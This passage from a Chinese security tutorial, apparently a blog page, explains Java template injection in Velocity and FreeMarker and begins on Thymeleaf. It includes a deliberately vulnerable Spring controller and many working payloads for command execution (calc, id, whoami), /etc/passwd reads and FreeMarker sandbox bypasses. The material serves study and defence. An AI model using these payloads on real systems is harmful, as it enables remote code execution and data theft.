class="line">#set($scan=$constructor.newInstance($input).useDelimiter(<span class="string">&quot;\A&quot;</span>))</span><br><span class="line">#<span class="keyword">if</span>($scan.hasNext())</span><br><span class="line">$scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<h4 id="evaluate例子："><a href="#evaluate例子：" class="headerlink" title="evaluate例子："></a>evaluate例子：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javasecssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/ssti/velocity&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">velocity1</span><span class="params">(<span class="meta">@RequestParam(defaultValue=&quot;nth347&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="string">&quot;Hello, &quot;</span> + username + <span class="string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Velocity.init();</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        <span class="comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span></span><br><span class="line">        Velocity.evaluate(ctx, out, <span class="string">&quot;test&quot;</span>, templateString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;cmd /C calc&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>弹出计算机</p>
+<h4 id="merage"><a href="#merage" class="headerlink" title="merage:"></a>merage:</h4><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p>
+<p>template ：待处理的 Velocity 模板。</p>
+<p>context ：上下文数据，即用于替换模板中占位符的数据。</p>
+<p>writer ：输出结果的写入器，用于将生成的结果写入到指定位置。</p>
+<p>创建对应的code</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/ssti/velocity2&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;nth347&quot;)</span> String username)</span> <span class="keyword">throws</span> IOException, ParseException, org.apache.velocity.runtime.parser.ParseException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(<span class="string">&quot;/path/to/template.vm&quot;</span>)));</span><br><span class="line">    templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(templateString);</span><br><span class="line"></span><br><span class="line">    <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">    ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">    org.apache.velocity.<span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.velocity.Template();</span><br><span class="line"></span><br><span class="line">    <span class="type">RuntimeServices</span> <span class="variable">runtimeServices</span> <span class="operator">=</span> RuntimeSingleton.getRuntimeServices();</span><br><span class="line">    <span class="type">SimpleNode</span> <span class="variable">node</span> <span class="operator">=</span> runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line"></span><br><span class="line">    template.setRuntimeServices(runtimeServices);</span><br><span class="line">    template.setData(node);</span><br><span class="line">    template.initDocument();</span><br><span class="line"></span><br><span class="line">    template.merge(ctx, out);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>模板文件template.vm内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is &lt;USERNAME&gt;.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51, 51, 51);">这段代码的主要作用是读取Velocity模板文件，替换模板中的占位符，然后使用给定的上下文对象进行模板渲染，并将渲染结果作为字符串返回<br></font>过程：</p>
+<ul>
+<li>使用templateString.replace对模板文件里的内容进行替换，这里的替换值可控</li>
+<li>runtimeServices.parse将模板内容进行解析</li>
+<li>template.merge(ctx, out);将模板内容进行渲染，这里会调用SimpleNode#render，过程大致和上面一致</li>
+</ul>
+<p>从指定路径读取模板文件，如果模板文件中带有攻击载荷语句，即可通过 template.merge 渲染触发模 板注入漏洞。所以我们需要修改vm渲染文件。</p>
+<p>假设我们到了后台，有模板修改的功能，那我们便可修改vm文件来进行攻击。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;sss&quot;</span>);</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="FreeMarker简介"><a href="#FreeMarker简介" class="headerlink" title="FreeMarker简介"></a>FreeMarker简介</h2><p>FreeMarker 是一款 _模板引擎_： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
+<p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
+<h3 id="FreeMarker语法"><a href="#FreeMarker语法" class="headerlink" title="FreeMarker语法"></a>FreeMarker语法</h3><p>说白了FreeMarker和JSP的EL表达式差不多 或者 跟thymleaf的语法是差不多的。</p>
+<p>都是使用${} 或者标签。</p>
+<h3 id="FreeMarker常用语法"><a href="#FreeMarker常用语法" class="headerlink" title="FreeMarker常用语法"></a>FreeMarker常用语法</h3><h4 id="if指令"><a href="#if指令" class="headerlink" title="if指令"></a>if指令</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#<span class="keyword">if</span> name==<span class="string">&#x27;李四&#x27;</span>&gt;</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="list指令"><a href="#list指令" class="headerlink" title="list指令"></a>list指令</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testList</span><span class="params">(Map&lt;String,Object&gt; map)</span>&#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt;  users = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lisi&quot;</span>,<span class="number">15</span>));</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="number">25</span>));</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">25</span>));</span><br><span class="line">    map.put(<span class="string">&quot;lists&quot;</span>,users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test2&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;#list lists as u&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> u_index%<span class="number">2</span>==<span class="number">0</span> &gt;&lt;tr style=<span class="string">&quot;background-color: red&quot;</span>&gt;&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> u_index%<span class="number">2</span>!=<span class="number">0</span>&gt;&lt;tr style=<span class="string">&quot;background-color: green&quot;</span>&gt;&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;$&#123;u.name&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;u.age&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;	</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="遍历Map"><a href="#遍历Map" class="headerlink" title="遍历Map"></a>遍历Map</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMap</span><span class="params">(Map&lt;String,Object&gt; map)</span>&#123;</span><br><span class="line">    HashMap&lt;String, Object&gt;  mp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    mp.put(<span class="string">&quot;1&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lisi&quot;</span>,<span class="number">15</span>));</span><br><span class="line">    mp.put(<span class="string">&quot;2&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">19</span>));</span><br><span class="line">    mp.put(<span class="string">&quot;3&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="number">20</span>));</span><br><span class="line">    map.put(<span class="string">&quot;ma&quot;</span>,mp);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;#list ma?keys as k&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;$&#123;ma[k].name&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;ma[k].age&#125;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="空值处理"><a href="#空值处理" class="headerlink" title="空值处理"></a>空值处理</h4><p>?? 判断是不为空</p>
+<p>${name!””} name 为空时 显示 “”</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;#<span class="keyword">if</span> name??&gt;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;#<span class="keyword">if</span> name??&gt;</span><br><span class="line">$&#123;name!<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="FreeMarker注入"><a href="#FreeMarker注入" class="headerlink" title="FreeMarker注入"></a>FreeMarker注入</h3><h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><h5 id="new"><a href="#new" class="headerlink" title="new"></a>new</h5><p>可创建任意实现了TemplateModel接口的Java对象，同时还可以触发没有实现 TemplateModel接口的类的静态初始化块。以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承TemplateModel接口的freemarker.template.utility.JythonRuntime和freemarker.template.utility.Execute。	</p>
+<h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><p>value?api 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod() 或 value?api.someBeanProperty。可通过 getClassLoader获取类加载器从而加载恶意类，或者也可以通过 getResource来实现任意文件读取。但是，当api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false。</p>
+<h5 id="一些poc1"><a href="#一些poc1" class="headerlink" title="一些poc1"></a>一些poc1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;open -a Calculator.app&quot;</span><span class="string">&quot;)&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign value=&quot;</span>freemarker.template.utility.ObjectConstructor<span class="string">&quot;?new()&gt;$&#123;value(&quot;</span>java.lang.ProcessBuilder<span class="string">&quot;,&quot;</span>whoami<span class="string">&quot;).start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign value=&quot;</span>freemarker.template.utility.JythonRuntime<span class="string">&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;</span>calc.exe<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign ex=&quot;</span>freemarker.template.utility.Execute<span class="string">&quot;?new()&gt; $&#123; ex(&quot;</span>open -a Calculator.app<span class="string">&quot;) &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">读取文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign is=object?api.class.getResourceAsStream(&quot;</span>/Test.class<span class="string">&quot;)&gt;</span></span><br><span class="line"><span class="string">FILE:[&lt;#list 0..999999999 as _&gt;</span></span><br><span class="line"><span class="string">    &lt;#assign byte=is.read()&gt;</span></span><br><span class="line"><span class="string">    &lt;#if byte == -1&gt;</span></span><br><span class="line"><span class="string">        &lt;#break&gt;</span></span><br><span class="line"><span class="string">    &lt;/#if&gt;</span></span><br><span class="line"><span class="string">$&#123;byte&#125;, &lt;/#list&gt;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;#assign uri=object?api.class.getResource(&quot;</span>/<span class="string">&quot;).toURI()&gt;</span></span><br><span class="line"><span class="string">&lt;#assign input=uri?api.create(&quot;</span>file:<span class="comment">///etc/passwd&quot;).toURL().openConnection()&gt;</span></span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里引入绕过沙箱的一些手法来源于blackhat议题，在深育杯比赛看到的考点。先来看一下blackhat的原payload</p>
+<p>此<code>payload</code>同样可用于<code>halo 1.2.0</code>版本</p>
+<p>这个payload需要freemarker+spring并设置<code>setExposeSpringMacroHelpers(true)</code>或是application.propertices中配置<code>spring.freemarker.expose-spring-macro-helpers=true</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;</span><br><span class="line">&lt;#assign fc=ac.getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;</span><br><span class="line">&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个是绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>]，得到以下payload</span><br><span class="line"></span><br><span class="line">&lt;#assign ac=Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>]&gt;</span><br><span class="line">&lt;#assign fc=ac.getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;</span><br><span class="line">&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">简化一下payload</span><br><span class="line"></span><br><span class="line">&lt;#assign fc=Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>].getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">$&#123;fc.setNewBuiltinClassResolver(fc.getDefaultConfiguration().getNewBuiltinClassResolver())&#125;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;whoami&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在加一些其他的绕过：根据Pwntester 2020年的议题 <a target="_blank" rel="noopener" href="https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf">https://media.defcon.org/DEF CON 28/DEF CON Safe Mode presentations/DEF CON Safe Mode - Alvaro Muñoz and Oleksandr Mirosh - Room For Escape Scribbling Outside The Lines Of Template Security.pdf</a> </p>
+<h5 id="绕过class-getClassloader反射加载Execute类"><a href="#绕过class-getClassloader反射加载Execute类" class="headerlink" title="绕过class.getClassloader反射加载Execute类"></a>绕过class.getClassloader反射加载Execute类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc=classloader.loadClass(<span class="string">&quot;freemarker.template.ObjectWrapper&quot;</span>)&gt;</span><br><span class="line">&lt;#assign dwf=owc.getField(<span class="string">&quot;DEFAULT_WRAPPER&quot;</span>).get(<span class="literal">null</span>)&gt;</span><br><span class="line">&lt;#assign ec=classloader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>)&gt;</span><br><span class="line">$&#123;dwf.newInstance(ec,<span class="literal">null</span>)(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA">https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA">https://www.cnblogs.com/nice0e3/p/16217471.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1412/#toc_0x03-thymeleaf">https://tttang.com/archive/1412/#toc_0x03-thymeleaf</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1661">https://forum.butian.net/share/1661</a></p>
+<h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p>Thymeleaf是众多模板引擎的一种和其他的模板引擎相比，它有如下优势：</p>
+<ul>
+<li>Thymeleaf使用html通过一些特定标签语法代表其含义，但并未破坏html结构，即使无网络、不通过后端渲染也能在浏览器成功打开，大大方便界面的测试和修改。</li>
+<li>Thymeleaf提供标准和Spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改JSTL、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</li>
+<li>Springboot官方大力推荐和支持，Springboot官方做了很多默认配置，开发者只需编写对应html即可，大大减轻了上手难度和配置复杂度。</li>
+</ul>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Lzy410992/article/details/115371017">https://blog.csdn.net/Lzy410992/article/details/115371017</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514?</a></p>
+<p>既然Thymeleaf也使用的html，那么如何区分哪些是Thymeleaf的html？</p>
+<p>在Thymeleaf的html中首先要加上下面的标识。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html xmlns:th=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>Thymeleaf提供了一些内置标签，通过标签来实现特定的功能。</p>
+<table>
+<thead>
+<tr>
+<th><strong>标签</strong></th>
+<th><strong>作用</strong></th>
+<th><strong>示例</strong></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>th:id</td>
+<td>替换id</td>
+<td><input th:id="${user.id}"/></td>
+<td></td>
+</tr>
+<tr>
+<td>th:text</td>
+<td>文本替换</td>
+<td><p text:="${user.name}">bigsai</p></td>
+<td></td>
+</tr>
+<tr>
+<td>th:utext</td>
+<td>支持html的文本替换</td>
+<td><p utext:="${htmlcontent}">content</p></td>
+<td></td>
+</tr>
+<tr>
+<td>th:object</td>
+<td>替换对象</td>
+<td><div th:object="${user}"></div></td>
+<td></td>
+</tr>
+<tr>
+<td>th:value</td>
+<td>替换值</td>
+<td><input th:value="${user.name}" ></td>
